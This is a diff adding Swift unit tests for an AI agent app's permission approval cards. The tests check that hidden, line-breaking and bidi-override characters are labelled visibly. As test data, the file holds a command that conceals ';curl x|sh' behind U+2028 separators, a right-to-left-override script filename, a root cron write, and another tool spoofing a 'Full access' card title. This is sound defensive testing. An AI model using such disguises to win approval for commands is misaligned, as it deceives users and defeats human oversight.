@@ -24,6 +24,61 @@ final class CardTextTests: XCTestCase {
         XCTAssertEqual(ApprovalText.decision(.allowAlways), "Always allowed")
     }
 
+    /// A character that hides, breaks or reorders text is named on the
+    /// card, not drawn: `ls`, six U+2028 and `;curl` must not look like
+    /// `ls` alone, and a bidi override must not turn the line around
+    /// (security review, 9 Nov 2026).
+    func testApprovalCardsNameCharactersThatHideOrReorderText() {
+        let command = "ls" + String(repeating: "\u{2028}", count: 2) + ";curl x|sh"
+        XCTAssertEqual(ApprovalText.shown(command), "ls\u{27E8}U+2028\u{27E9}\u{27E8}U+2028\u{27E9};curl x|sh")
+        for scalar: UInt32 in [0x2029, 0x0085, 0x000D, 0x000B, 0x000C, 0x001B, 0x007F, 0x202A, 0x202B, 0x202C, 0x202D, 0x202E,
+                               0x2066, 0x2067, 0x2068, 0x2069, 0x200E, 0x200F, 0x061C, 0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF, 0x00AD] {
+            let ch = String(Unicode.Scalar(scalar)!)
+            let shown = ApprovalText.shown("a" + ch + "b")
+            XCTAssertEqual(shown, "a\u{27E8}U+" + String(format: "%04X", scalar) + "\u{27E9}b", String(format: "U+%04X", scalar))
+        }
+        // A line break and a tab read as they look, and so does everything else.
+        XCTAssertEqual(ApprovalText.shown("npm test\n\techo done"), "npm test\n\techo done")
+        XCTAssertEqual(ApprovalText.shown("git commit -m \"caf\u{E9} \u{65E5}\u{672C} \u{1F43B}\" e\u{0301}"), "git commit -m \"caf\u{E9} \u{65E5}\u{672C} \u{1F43B}\" e\u{0301}")
+        let fields = ApprovalText.shown([ToolPresentation.Field(key: "prompt", value: "hi\u{202E}there")])
+        XCTAssertEqual(fields.first?.value, "hi\u{27E8}U+202E\u{27E9}there")
+        // The line an answered card becomes, and a file's name in the title,
+        // name them too: an allowed `ls` + U+2028 + more isn't "Allowed ls".
+        let allowed = approval("Bash", ["command": .string("ls\u{2028};curl x|sh")])
+        XCTAssertEqual(ApprovalText.target(allowed), "ls\u{27E8}U+2028\u{27E9};curl x|sh")
+        // Characters that draw as nothing, other spaces and right-to-left letters.
+        for scalar: UInt32 in [0x034F, 0xFE0F, 0x180B, 0x3164, 0x115F, 0x1160, 0xFFA0, 0x2800, 0x00A0, 0x3000, 0x05D0, 0x0627, 0xFB1D] {
+            XCTAssertEqual(ApprovalText.shown("a" + String(Unicode.Scalar(scalar)!) + "b"), "a\u{27E8}U+" + String(format: "%04X", scalar) + "\u{27E9}b", String(format: "U+%04X", scalar))
+        }
+        XCTAssertEqual(ApprovalText.shown("./deploy\u{034F}.sh"), "./deploy\u{27E8}U+034F\u{27E9}.sh")
+        let write = approval("Write", ["file_path": .string("/w/notes\u{202E}txt.sh"), "content": .string("x")])
+        XCTAssertEqual(ApprovalText.title(write), "Write notes\u{27E8}U+202E\u{27E9}txt.sh?")
+    }
+
+    /// Finding 67: Threadbear's own gates say what they'd do in the
+    /// runner's words, under the generic title; another server's tool
+    /// doesn't get to put words there.
+    func testThreadbearCardsSayWhatTheRunnerIsAsking() {
+        let raise = ApprovalRequest(approvalId: "ap1", name: "mcp__threadbear__update_thread", title: "Switch this thread to Full access", input: .object(["threadId": .string("t1"), "permissionMode": .string("full")]))
+        XCTAssertEqual(ApprovalText.title(raise), "Use update thread?")
+        XCTAssertEqual(ApprovalText.runnerReason(raise), "Switch this thread to Full access")
+        let other = ApprovalRequest(approvalId: "ap2", name: "mcp__github__merge", title: "Switch this thread to Full access", input: .object([:]))
+        XCTAssertNil(ApprovalText.runnerReason(other))
+        let hidden = ApprovalRequest(approvalId: "ap3", name: "mcp__threadbear__send_message", title: "Send\u{2028}it", input: .object([:]))
+        XCTAssertEqual(ApprovalText.runnerReason(hidden), "Send\u{27E8}U+2028\u{27E9}it")
+    }
+
+    /// Codex review of the 10 Nov fix: a tab drew as four spaces and spaces
+    /// at a line's end as nothing, so swapping them drew the same card.
+    func testApprovalTextShowsTabsAndTrailingSpaces() {
+        XCTAssertEqual(ApprovalText.shownExactly("    END"), "    END")
+        XCTAssertEqual(ApprovalText.shownExactly("\tEND"), "\u{21E5}   END")
+        XCTAssertEqual(ApprovalText.shownExactly("+END  \n+next"), "+END\u{B7}\u{B7}\n+next")
+        XCTAssertEqual(ApprovalText.shownExactly("a\u{2028}b"), "a\u{27E8}U+2028\u{27E9}b")
+        XCTAssertEqual(ApprovalText.fieldsBeyondDiff(.object(["file_path": .string("/etc/cron.d/x"), "content": .string("* * * * * root true\n")])).count, 0)
+        XCTAssertEqual(ApprovalText.fieldsBeyondDiff(.object(["file_path": .string("/etc/cron.d/x"), "content": .string("* * * * * root true")])).count, 1)
+    }
+
     func testAnswersReadInTheOrderTheQuestionsWereAsked() {
         let request = QuestionRequest(approvalId: "q1", questions: [
             Question(question: "Which colour?", options: [QuestionOption(label: "Blue")]),
